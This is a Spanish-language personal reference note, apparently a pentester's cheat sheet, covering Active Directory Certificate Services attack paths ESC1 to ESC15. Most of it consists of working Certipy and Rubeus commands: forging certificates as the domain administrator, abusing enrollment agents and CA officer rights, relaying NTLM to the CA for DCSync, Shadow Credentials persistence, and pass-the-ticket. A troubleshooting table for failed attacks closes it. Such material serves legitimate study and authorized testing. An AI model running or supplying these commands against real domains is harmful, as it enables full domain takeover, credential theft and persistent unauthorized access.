---
tipo: meta
aliases:
  - Certipy
  - ESC1 ESC8
  - certificados AD
  - ADCS ESC
tags:
  - meta/referencia
  - dominio/ad
---

# ADCS - matriz de referencia

> [!info] Referencia pura, no un zettel
> El catálogo de configuraciones abusables de la CA de AD y el comando de cada una. El criterio está en [[ADCS - certificado con SAN arbitrario]] (ESC1), [[ADCS - plantilla abusable por propósito o ACL]] y [[ADCS - abuso de la configuración de la CA]]; el modelo, en [[MOC - Active Directory]].

## 0. Encontrar todo — Certipy

```sh
certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -stdout
certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -vulnerable -stdout
certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -json      # para revisar todo
```

`-vulnerable` marca cada plantilla o CA con el `ESCx` que aplica. Es el primer comando: dice qué rama del catálogo está abierta.

## 1. El catálogo, por dónde vive el fallo

| Código | Dónde | Qué está mal | Nota de criterio |
|---|---|---|---|
| `ESC1` | Plantilla | El solicitante fija el sujeto (SAN) + EKU de autenticación | [[ADCS - certificado con SAN arbitrario]] |
| `ESC2` | Plantilla | EKU "cualquier propósito" o sin EKU | [[ADCS - plantilla abusable por propósito o ACL]] |
| `ESC3` | Plantilla | EKU de agente de inscripción → pedir por otro | idem |
| `ESC4` | Plantilla | ACL escribible → convertirla en ESC1 | idem |
| `ESC5` | Objetos AD | ACL sobre la CA/objetos de PKI en el directorio | idem |
| `ESC6` | CA | Bandera `EDITF_ATTRIBUTESUBJECTALTNAME2` → SAN en cualquier plantilla | [[ADCS - abuso de la configuración de la CA]] |
| `ESC7` | CA | ACL `ManageCA`/`ManageCertificates` | idem |
| `ESC8` | CA | Endpoint web de inscripción acepta NTLM (relay) | idem |
| `ESC9` | Plantilla | Sin extensión de seguridad → mapeo débil | idem |
| `ESC10` | CA/config | Mapeo de certificado débil (registro) | idem |
| `ESC11` | CA | Endpoint RPC de inscripción relayable | idem |
| `ESC13` | Plantilla | Política de emisión ligada a un grupo privilegiado | idem |
| `ESC15` | Plantilla | EKUwu — EKU de aplicación arbitraria (CVE-2024-49019) | idem |

## 2. ESC1 — SAN arbitrario

Ver [[ADCS - certificado con SAN arbitrario]].

```sh
certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template VulnTemplate \
  -upn administrador@dominio.local -dc-ip 10.0.0.10
certipy auth -pfx administrador.pfx -dc-ip 10.0.0.10
```

`auth` devuelve el TGT y el hash NT del administrador.

## 3. ESC2 — cualquier propósito

La plantilla tiene EKU "Any Purpose" o ninguno: el certificado sirve para autenticar aunque no lo diga.

```sh
certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template ESC2Template
# el cert vale para autenticar; usar como en ESC1 si además permite SAN,
# o como agente de inscripción (ESC3) si aplica
```

## 4. ESC3 — agente de inscripción

Una plantilla con EKU `Certificate Request Agent` permite pedir certificados **en nombre de otro**:

```sh
# 1. obtener el cert de agente
certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template ESC3-Agent
# 2. usarlo para pedir un cert de autenticación como administrador
certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template User \
  -on-behalf-of 'dominio\administrador' -pfx agent.pfx
certipy auth -pfx administrador.pfx
```

## 5. ESC4 — ACL de plantilla escribible

Si se tiene `WriteProperty` sobre una plantilla, se la reconfigura para volverla ESC1, se explota, y se la deja como estaba:

```sh
certipy template -u user@dominio.local -p 'pass' -template VulnTemplate -save-old
# ahora la plantilla es ESC1 → explotar como § 2
# restaurar
certipy template -u user@dominio.local -p 'pass' -template VulnTemplate \
  -configuration VulnTemplate.json
```

## 6. ESC6 — SAN en cualquier plantilla (bandera de CA)

La CA tiene `EDITF_ATTRIBUTESUBJECTALTNAME2`: acepta un SAN arbitrario en **cualquier** plantilla, aunque la plantilla no lo permita.

```
certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template User \
  -upn administrador@dominio.local
```

Ver [[ADCS - abuso de la configuración de la CA]].

## 7. ESC7 — ACL de la CA

Con `ManageCA` se puede habilitar la bandera de ESC6, o con `ManageCertificates` aprobar una petición pendiente:

```sh
certipy ca -u user@dominio.local -p 'pass' -ca CA-NAME -add-officer user   # ManageCertificates
certipy ca -u user@dominio.local -p 'pass' -ca CA-NAME -enable-template SubCA
# pedir contra SubCA (falla, queda pendiente), luego aprobar la propia petición
certipy ca -u user@dominio.local -p 'pass' -ca CA-NAME -issue-request 12
```

## 8. ESC8 / ESC11 — relay a la inscripción

El endpoint de inscripción (web HTTP para ESC8, RPC para ESC11) acepta NTLM. Se relaya una autenticación coaccionada — ver [[Relay de NTLM]] y [[AD envenenamiento y relay - matriz de referencia]] § 5:

```sh
certipy relay -target http://ca.dominio.local -template DomainController   # ESC8
# coaccionar el DC a autenticarse al relay → cert del DC → DCSync
```

## 9. ESC9 / ESC10 — mapeo débil

Sin la extensión de seguridad (`szOID_NTDS_CA_SECURITY_EXT`) o con mapeo implícito, un certificado con el UPN de la víctima autentica como ella. Se combina con control de la cuenta para cambiarle el UPN:

```sh
# cambiar el UPN de una cuenta controlada al del objetivo, pedir cert, revertir
certipy account update -u user@dominio.local -p 'pass' -user CTRL -upn administrador
certipy req ... -template ESC9Template
certipy account update -u user@dominio.local -p 'pass' -user CTRL -upn CTRL
certipy auth -pfx cert.pfx -domain dominio.local
```

## 10. THEFT — robar certificados existentes

No es una mala configuración, es persistencia: robar un cert ya emitido y su clave.

```sh
certipy find -u user -p pass -dc-ip 10.0.0.10 -stdout   # ver qué hay
# desde una máquina comprometida
certipy shadow auto -u user@dominio.local -p 'pass' -account objetivo   # Shadow Credentials (msDS-KeyCredentialLink)
Rubeus.exe asktgt /user:objetivo /certificate:robado.pfx /ptt
```

Shadow Credentials (escribir `msDS-KeyCredentialLink`) es la persistencia por certificado más limpia: se agrega una clave propia a una cuenta y se pide su TGT sin tocar su contraseña.

## 11. Usar el certificado

Común a todo el catálogo:

```sh
certipy auth -pfx cert.pfx -dc-ip 10.0.0.10                 # TGT + hash NT
Rubeus.exe asktgt /user:usuario /certificate:cert.pfx /ptt  # desde Windows
# el hash NT que devuelve auth sirve para pass-the-hash
```

## 12. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `certipy find` no marca nada vulnerable | La PKI está bien configurada, o falta permiso de lectura |
| `req` falla con `denied` | No hay permiso de inscripción sobre la plantilla |
| `auth` da `KDC_ERR_CLIENT_NAME_MISMATCH` | Falta la extensión de mapeo fuerte (KB5014754); probar ESC9/10 o `-ldap-shell` |
| El SAN no se aplica | La plantilla no lo permite y no hay ESC6; probar otra rama |
| ESC8 relay no recibe | Coacción no dispara, o el endpoint exige HTTPS con binding |
| `on-behalf-of` rechazado | La plantilla no tiene EKU de agente; no es ESC3 |
| El cert autentica pero sin privilegio | El sujeto no era el objetivo; revisar el UPN/SAN puesto |

## Relacionadas

[[MOC - Active Directory]] · [[ADCS - certificado con SAN arbitrario]] · [[ADCS - abuso de la configuración de la CA]] · [[AD persistencia - matriz de referencia]] · [[Relay de NTLM]]
